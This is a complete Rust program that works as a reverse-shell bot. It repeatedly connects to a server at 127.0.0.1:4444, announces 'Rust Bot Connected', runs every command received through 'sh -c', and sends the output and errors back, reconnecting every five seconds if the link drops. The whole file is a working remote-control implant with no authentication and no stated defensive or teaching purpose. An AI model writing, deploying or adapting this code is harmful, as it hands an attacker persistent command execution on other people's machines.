use std::io::{self, Read, Write};
use std::net::TcpStream;
use std::process::{Command, Stdio};

fn main() -> io::Result<()> {
    let server_address = "127.0.0.1:4444";

    loop {
        match TcpStream::connect(server_address) {
            Ok(mut stream) => {
                println!("Connected to server at {}", server_address);

                // Send identification message
                let identification = "Rust Bot Connected\n";
                stream.write_all(identification.as_bytes())?;
                stream.flush()?;

                loop {
                    // Read command from server
                    let mut buffer = [0; 1024];
                    match stream.read(&mut buffer) {
                        Ok(0) => {
                            // Connection closed by server
                            println!("Connection closed by server");
                            break;
                        }
                        Ok(n) => {
                            let command_str = String::from_utf8_lossy(&buffer[..n]);
                            let command_str = command_str.trim();

                            if command_str.is_empty() {
                                continue;
                            }

                            println!("Received command: {}", command_str);

                            // Execute command
                            let output = Command::new("sh")
                                .arg("-c")
                                .arg(command_str)
                                .stdout(Stdio::piped())
                                .stderr(Stdio::piped())
                                .output();

                            match output {
                                Ok(output) => {
                                    let stdout = String::from_utf8_lossy(&output.stdout);
                                    let stderr = String::from_utf8_lossy(&output.stderr);
                                    let status = if output.status.success() {
                                        "SUCCESS"
                                    } else {
                                        "FAILED"
                                    };

                                    let response = format!(
                                        "=== Command: {} ===\nStatus: {}\nOutput:\n{}\nErrors:\n{}\n=== End ===\n",
                                        command_str, status, stdout, stderr
                                    );

                                    // Send result back to server
                                    stream.write_all(response.as_bytes())?;
                                    stream.flush()?;
                                }
                                Err(e) => {
                                    let error_msg = format!(
                                        "=== Command: {} ===\nStatus: ERROR\nError: {}\n=== End ===\n",
                                        command_str, e
                                    );
                                    stream.write_all(error_msg.as_bytes())?;
                                    stream.flush()?;
                                }
                            }
                        }
                        Err(e) => {
                            println!("Failed to read from stream: {}", e);
                            break;
                        }
                    }
                }
            }
            Err(e) => {
                println!("Failed to connect to server: {}. Retrying in 5 seconds...", e);
                std::thread::sleep(std::time::Duration::from_secs(5));
            }
        }
    }
}

